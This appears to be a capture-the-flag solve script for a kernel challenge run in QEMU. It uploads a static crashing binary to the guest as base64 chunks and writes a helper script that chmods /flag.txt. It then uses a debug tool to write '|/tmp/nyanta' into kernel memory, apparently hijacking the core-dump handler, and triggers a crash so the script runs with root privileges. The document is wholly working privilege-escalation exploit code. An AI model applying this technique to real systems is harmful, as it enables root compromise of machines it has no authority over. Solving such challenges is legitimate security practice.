from ptrlib import *
import os
import base64

def run_cmd(cmd):
    sock.sendlineafter("$ ", cmd)

os.system("gcc crash.c -o crash -static -nostdlib")
os.system("strip --strip-all crash")
with open("crash", "rb") as f:
    code = f.read()

sock = Process("./start-qemu.sh")

run_cmd("cd /tmp")
run_cmd("echo '#!/bin/sh' >> nyanta")
run_cmd("echo 'chmod 777 /flag.txt' >> nyanta")
run_cmd("chmod +x nyanta")
data = base64.b64encode(code)
s = 0
for block in chunks(data, 0x300):
    logger.info(f"{s} / {len(data)}")
    run_cmd("echo '" + block.decode() + "' >> b64pwn")
    s += 0x300

run_cmd("cat b64pwn | base64 -d > pwn")
run_cmd("chmod +x pwn")
run_cmd("printf '|/tmp/nyanta\x00' | hwdbg mw 13 0x34ac2a0")
run_cmd("./pwn")
run_cmd("cat /flag.txt")

sock.interactive()

